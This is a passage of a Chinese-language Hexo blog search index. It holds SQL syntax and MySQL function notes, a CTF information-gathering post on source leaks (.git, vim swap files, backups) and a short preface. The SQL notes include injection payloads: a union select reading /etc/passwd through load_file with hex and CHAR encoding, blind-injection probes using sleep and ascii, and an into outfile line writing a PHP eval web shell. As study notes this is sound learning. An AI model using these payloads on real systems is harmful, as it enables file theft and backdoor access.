class="hljs-keyword">values</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;eee&#x27;</span>,<span class="hljs-string">&#x27;fff&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span> (<span class="hljs-number">6</span>,&quot;eee&quot;,&quot;fff&quot;);<br></code></pre></td></tr></table></figure><h3 id="update更新表中的数据"><a href="#update更新表中的数据" class="headerlink" title="update更新表中的数据"></a>update更新表中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> student <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span>&quot;root&quot;,password<span class="hljs-operator">=</span>&quot;root1&quot; <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228115131492.png" alt="image-20230228115131492"></p><h3 id="alter-table-更新表"><a href="#alter-table-更新表" class="headerlink" title="alter table 更新表"></a>alter table 更新表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span>;     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>增加新列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span>;               <span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>旧表名<span class="hljs-operator">&gt;</span> rename <span class="hljs-keyword">to</span> <span class="hljs-operator">&lt;</span>新表名<span class="hljs-operator">&gt;</span>;   # 重命名表<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228154309683.png" alt="image-20230228154309683"></p><h3 id="like-在where子句中搜索列中的指定模式"><a href="#like-在where子句中搜索列中的指定模式" class="headerlink" title="like 在where子句中搜索列中的指定模式"></a>like 在where子句中搜索列中的指定模式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> &quot;ad%&quot;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228115351727.png" alt="image-20230228115351727"></p><h3 id="union-合并两个或多个select语句的结果"><a href="#union-合并两个或多个select语句的结果" class="headerlink" title="union 合并两个或多个select语句的结果"></a>union 合并两个或多个select语句的结果</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> student <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> stu_id <span class="hljs-keyword">from</span> student;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228115707119.png" alt="image-20230228115707119"></p><h3 id="别名-as"><a href="#别名-as" class="headerlink" title="别名(as)"></a>别名(as)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">as</span> <span class="hljs-operator">&lt;</span>别名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><h3 id="create-table创建表"><a href="#create-table创建表" class="headerlink" title="create table创建表"></a>create table创建表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>(<br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">3</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br>...<br>);<br></code></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="user"><a href="#user" class="headerlink" title="user()"></a>user()</h3><ul><li>查看当前数据库用户</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228120102644.png" alt="image-20230228120102644"></p><h3 id="database"><a href="#database" class="headerlink" title="database()"></a>database()</h3><ul><li>查看当前数据库的名字</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228125958355.png" alt="image-20230228125958355"></p><h3 id="version"><a href="#version" class="headerlink" title="version()"></a>version()</h3><ul><li>查看当前数据库的版本信息</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228130050495.png" alt="image-20230228130050495"></p><h3 id="hostname"><a href="#hostname" class="headerlink" title="@@hostname"></a>@@hostname</h3><ul><li>查看当前计算机的用户名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@hostname</span>;<br></code></pre></td></tr></table></figure><h3 id="datadir"><a href="#datadir" class="headerlink" title="@@datadir"></a>@@datadir</h3><ul><li>查看mysql的data目录的绝对路径</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228130335710.png" alt="image-20230228130335710"></p><h3 id="version-compile-os"><a href="#version-compile-os" class="headerlink" title="@@version_compile_os"></a>@@version_compile_os</h3><ul><li>查看操作系统位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228130518306.png" alt="image-20230228130518306"></p><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><ul><li>读取文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>),<span class="hljs-number">3</span>#<br># 编码<br><span class="hljs-number">1</span><span class="hljs-operator">-</span>十六进制编码<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-number">0x2f6574632f706173737764</span>),<span class="hljs-number">3</span>#  <br><span class="hljs-number">0x2f6574632f706173737764</span><span class="hljs-comment">---&gt;/etc/passwd</span><br><span class="hljs-number">2</span><span class="hljs-operator">-</span><span class="hljs-type">CHAR</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-type">CHAR</span>(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),<span class="hljs-number">3</span>#<br><br></code></pre></td></tr></table></figure><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><ul><li>类似于等号，可以使用通配符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a&#x27;</span>;  # 查询username是a的字段<br># 带有<span class="hljs-operator">%</span>通配符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>  #  查询username中开头是a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a%&#x27;</span>　# 查询username中含有a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a&#x27;</span>  # 查询username中结尾是a的字段<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228131858089.png" alt="image-20230228131858089"></p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp()"></a>regexp()</h3><ul><li>只要有就能匹配，like是等于才匹配</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp(<span class="hljs-string">&#x27;ad&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp <span class="hljs-string">&#x27;ad&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><ul><li>sleep(x)—-暂停x秒后执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>);<br># 这样写前面查询结果为空<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228132539314.png" alt="image-20230228132539314"></p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><ul><li>if(条件,1,0) 如果条件成立，那么返回1，反之返回0，这里的返回值是可以任意修改的，也可以写表达式</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> if (<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><ul><li>mid(a,b,c) 从b位置开始，截取a字符串的c位</li><li>mid()字符串的下标是从1开始算的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228132919936.png" alt="image-20230228132919936"></p><h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><ul><li>substr(a,b,c) 从b位置开始，截取字符串a长度为c的字符串，这个与mid不同的是substr的b和c可以自动取整 substr从1开始计位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228133303859.png" alt="image-20230228133303859"></p><h3 id="left"><a href="#left" class="headerlink" title="left"></a>left</h3><ul><li>left(a,b) 从左侧截取a的前b位</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;st&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228133514200.png" alt="image-20230228133514200"></p><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><ul><li>length()判断长度 比如说length(database())&#x3D;8 判断数据库名的长度是不是等于8</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228133712719.png" alt="image-20230228133712719"></p><h3 id="ord-ascii"><a href="#ord-ascii" class="headerlink" title="ord ascii"></a>ord ascii</h3><ul><li>ord()返回目标对应的ascii码值 ascii()与ord一致</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ord(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ascii(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228134029242.png" alt="image-20230228134029242"></p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><ul><li>返回几列 比如limit(1,2)的意思就是从第一列开始返回2列 limit是从0开始计数的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;students&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228134316450.png" alt="image-20230228134316450"></p><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><ul><li>连接一个或多个字符串</li><li>concat_ws ：与concat基本一致，多了参数分隔符</li><li>group_concat()：连接每一个字符串默认以逗号分割的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;stu&#x27;</span>,<span class="hljs-string">&#x27;dent&#x27;</span>);<br><span class="hljs-keyword">select</span> group_concat(database(),version());<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228151005441.png" alt="image-20230228151005441"></p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228151225977.png" alt="image-20230228151225977"></p><h3 id="into-outfile写文件"><a href="#into-outfile写文件" class="headerlink" title="into outfile写文件"></a>into outfile写文件</h3><ul><li>magic_quotes_gpc&#x3D;OFF</li><li>用户有写权限</li><li>不能覆盖已经存在的文件</li><li>必须是最后一个查询语句</li><li>知道网站的绝对路径</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;c:\www\1.php &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><ul><li>向下取整</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228151724767.png" alt="image-20230228151724767"></p><h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue"></a>extractValue</h3><ul><li>从目标xml中返回包含所查询的字符串</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(xml_document,xpath_string)<br>xml_document:string类型,为xml对象的名称<br>xpath_string:xpath格式的字符串<br></code></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><ul><li>修改xml文档中的内容</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(文件名，路径，数值)<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li>相当于自然对数的N次方</li><li>自然对数是以常数e为底数的对数，记作lnN（N&gt;0）。</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228153522318.png" alt="image-20230228153522318"></p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://alonglx.blog.csdn.net/article/details/124634092?spm=1001.2014.3001.5502">(91条消息) 一篇文章彻底学懂SQL注入(包含基础数据库句法、SQL注入原理以及所有常见SQL注入类型以及绕过手法)_为什么sql注入用字段_AlongLx的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/57558184">SQL基础知识总结 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>sql基础语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/02/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/02/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h3 id="1-1-robots-txt"><a href="#1-1-robots-txt" class="headerlink" title="1.1 robots.txt"></a>1.1 robots.txt</h3><p>robots.txt文件是一个文本文件，使用任何一个常见的<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91/6282252">文本编辑</a>器，比如Windows<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/56370294">系统安装</a>了Notepad，就可以创建和编辑它 .robots.txt是一个协议，而不是一个命令。robots.txt是<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F/4972146">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p><ul><li>robots协议并不是一个规范，而只是约定俗成的，不能保证网站的隐私</li></ul><h3 id="1-2-PHPs源码泄露"><a href="#1-2-PHPs源码泄露" class="headerlink" title="1.2 PHPs源码泄露"></a>1.2 PHPs源码泄露</h3><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><p>常见源码泄露类型：<a href="https://www.cnblogs.com/Lmg66/p/13598803.html">ctf常见源码泄露 - Lmg66 - 博客园 (cnblogs.com)</a></p><h3 id="1-3-常见版本控制工具"><a href="#1-3-常见版本控制工具" class="headerlink" title="1.3 常见版本控制工具"></a>1.3 常见版本控制工具</h3><ul><li><p>.svn</p></li><li><p>.git</p></li><li><p>.hg</p></li><li><p>.cvs</p></li><li><p>.开头的文件在linux里属于隐藏文件，可能未发现文件部署到生产环境中造成泄露</p></li></ul><h3 id="1-4-Vim泄露"><a href="#1-4-Vim泄露" class="headerlink" title="1.4 Vim泄露"></a>1.4 Vim泄露</h3><p><strong>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</strong></p><ul><li>在linux中的隐藏文件前面加.</li><li>缓存文件是隐藏文件例如.index.php.swp</li></ul><h3 id="1-5-php探针"><a href="#1-5-php探针" class="headerlink" title="1.5 php探针"></a>1.5 php探针</h3><p> php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p><ul><li>雅黑探针的使用<ul><li>下载到本地电脑，再用 ftp 软件上传到网站任意目录中。绑定域名后，可以用类似 域名&#x2F;tz.php 这类网址访问。</li></ul></li></ul><h3 id="1-6-常见备份文件后缀名"><a href="#1-6-常见备份文件后缀名" class="headerlink" title="1.6 常见备份文件后缀名"></a>1.6 常见备份文件后缀名</h3><p>“.git” 、“.<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a>”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”</p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2023/02/24/%E5%89%8D%E8%A8%80/"/>
    <url>/2023/02/24/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>   在大学快要两年的时间，学了不少的东西，看过不少的风景，增加了不少的经历。但是这些阅历的成长总是得不到长时间的记录，时间久了之后慢慢的淡出记忆，所以我搭建了这样一个博客来记录自己的学习和生活。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
